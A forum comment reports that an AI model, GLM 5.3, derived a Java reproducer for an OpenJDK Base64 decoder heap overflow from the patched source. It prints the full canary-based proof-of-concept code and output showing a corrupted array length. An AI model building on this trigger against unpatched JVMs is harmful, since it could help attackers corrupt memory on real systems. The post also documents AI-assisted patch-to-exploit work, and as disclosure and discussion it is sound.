  author: fweimer
  text: "GLM 5.3 produced this after a bit of prodding. I started out with the C++
    sources with a bug marker instead of the fix: <a href=\"https:&#x2F;&#x2F;github.com&#x2F;openjdk&#x2F;jdk&#x2F;commit&#x2F;5177a70b385c16f26ede191fdac7aaba0bed0f8b\"
    rel=\"nofollow\">https:&#x2F;&#x2F;github.com&#x2F;openjdk&#x2F;jdk&#x2F;commit&#x2F;5177a70b385c16f26ede19...</a><p>There
    are only a bunch of commits that came in the latest merge of security fixes, and
    this one changed VBMI-related intrinsics code, so it&#x27;s a good match for what
    was publicly disclosed at the time.<p><pre><code>    import java.util.Arrays;\n
    \   import java.util.Base64;\n    \n    public class Canary {\n        &#x2F;&#x2F;
    static fields defeat escape analysis so dst&#x2F;canary really live in the heap\n
    \       static byte[] dst;\n        static byte[] canary;\n    \n        public
    static void main(String[] args) {\n            &#x2F;&#x2F; (input, expected decodedOutLength)
    pairs:\n            &#x2F;&#x2F;   65 = &quot;A&quot;*64 + &quot;=&quot;    -&gt;
    fragment &quot;=&quot;   (length 1, trailing pad)\n            &#x2F;&#x2F;   66
    = &quot;A&quot;*64 + &quot;Q=&quot;   -&gt; fragment &quot;Q=&quot;  (length 2,
    trailing pad)\n            &#x2F;&#x2F;   67 = &quot;A&quot;*64 + &quot;QQ=&quot;
    \ -&gt; fragment &quot;QQ=&quot; (length 3, trailing pad)\n            &#x2F;&#x2F;
    \  68 = &quot;A&quot;*64 + &quot;QQ==&quot; -&gt; fragment 4 bytes, well-formed
    control case\n            int[][] cases = { { 65, 50 }, { 66, 50 }, { 67, 50 },
    { 68, 49 } };\n            byte[][] srcs = new byte[cases.length][];\n            for
    (int c = 0; c &lt; cases.length; c++) {\n                int len = cases[c][0];\n
    \               byte[] src = new byte[len];\n                Arrays.fill(src,
    (byte) &#x27;A&#x27;);\n                if (len == 65) { src[64] = &#x27;=&#x27;;
    }\n                if (len == 66) { src[64] = &#x27;Q&#x27;; src[65] = &#x27;=&#x27;;
    }\n                if (len == 67) { src[64] = &#x27;Q&#x27;; src[65] = &#x27;Q&#x27;;
    src[66] = &#x27;=&#x27;; }\n                if (len == 68) { src[64] = &#x27;Q&#x27;;
    src[65] = &#x27;Q&#x27;; src[66] = &#x27;=&#x27;;\n                    src[67]
    = &#x27;=&#x27;; }\n                srcs[c] = src;\n            }\n    \n            int
    iters = 300_000;\n            for (int iter = 0; iter &lt; iters; iter++) {\n
    \               for (int c = 0; c &lt; cases.length; c++) {\n                    byte[]
    src = srcs[c];\n                    int dstLen = cases[c][1];\n                    &#x2F;&#x2F;
    fresh dst, then canary IMMEDIATELY after it in the TLAB\n                    dst
    = new byte[dstLen];\n                    canary = new byte[64];\n                    Arrays.fill(canary,
    (byte) 0x41);\n                    int before = canary.length;\n                    try
    {\n                        Base64.getDecoder().decode(src, dst);\n                    }
    catch (IllegalArgumentException e) {\n                        &#x2F;&#x2F; expected
    for the malformed tails\n                    }\n                    if (canary.length
    != before || changed(canary)) {\n                        System.out.println(\n
    \                           &quot;*** ITERATION &quot; + iter + &quot;, input
    length &quot; + src.length\n                            + &quot;: DESTINATION
    BUFFER OVERRUN DETECTED&quot;);\n                        System.out.println(\n
    \                           &quot;canary.length = &quot; + canary.length + &quot;
    (expected 64)&quot;);\n                        System.out.println(\n                            &quot;canary
    bytes  = &quot; + toHex(canary, 48));\n                        return;\n                    }\n
    \               }\n                if (iter % 50_000 == 0)\n                    System.out.println(&quot;iter
    &quot; + iter + &quot;: clean so far&quot;);\n            }\n            System.out.println(\n
    \               &quot;no corruption detected in &quot; + iters + &quot; iterations&quot;);\n
    \       }\n    \n        static boolean changed(byte[] b) {\n            for (byte
    x : b) if (x != 0x41) return true;\n            return false;\n        }\n    \n
    \       static String toHex(byte[] b, int n) {\n            StringBuilder sb =
    new StringBuilder();\n            for (int i = 0; i &lt; 64; i++)\n                sb.append(String.format(&quot;%02x
    &quot;, b[i]));\n            return sb.toString();\n        }\n    }\n</code></pre>\nI
    had to fix toHex() not to use b.length, otherwise it wouldn&#x27;t print anything
    due to the negative array length field.<p><pre><code>    *** ITERATION 4076, input
    length 67: DESTINATION BUFFER OVERRUN DETECTED\n    canary.length = -1700370022
    (expected 64)\n    canary bytes  = 69 a6 9a 69 a6 9a 69 a6 9a 69 a6 9a 69 a6 9a
    69 a6 9a 69 a6 9a 69 a6 9a 9a 9a 9a 9a 9a 9a 9a 9a 9a 9a 9a 9a 9a 9a 9a 9a 41
    41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 \n\n</code></pre>\nGLM
    had web access for this, and it was able retrieve the OpenJDK fix. I don&#x27;t
    know if it found the reproducer in its web searches.<p>Turning this into a reliable
    exploit probably still requires some expertise. It&#x27;s going to depend on heap
    layout at the time of the overflow. Targets won&#x27;t be auto-selecting themselves
    like they did for Log4Shell."
